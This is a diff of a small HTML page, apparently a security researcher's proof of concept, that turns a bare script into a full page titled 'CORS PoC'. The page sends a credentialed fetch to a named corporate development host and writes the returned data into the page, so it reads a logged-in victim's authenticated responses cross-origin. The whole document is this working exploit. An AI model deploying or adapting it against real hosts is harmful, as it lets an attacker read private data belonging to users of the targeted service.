@@ -1,11 +1,19 @@
-<!-- cors-exploit.html -->
-<script>
-  fetch("https://dq-testing-dev.corp.afterpay.com", {
-    method: "GET",
-    credentials: "include"
-  })
-  .then(response => response.text())
-  .then(data => {
-    document.write("<pre>" + data + "</pre>");
-  });
-</script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>🔥 CORS PoC</h1>
+    <script>
+      fetch("https://dq-testing-dev.corp.afterpay.com", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.body.innerHTML += "<pre>" + data + "</pre>";
+      })
+      .catch(err => {
+        document.body.innerHTML += "<pre style='color:red'>" + err + "</pre>";
+      });
+    </script>
+  </body>
+</html>
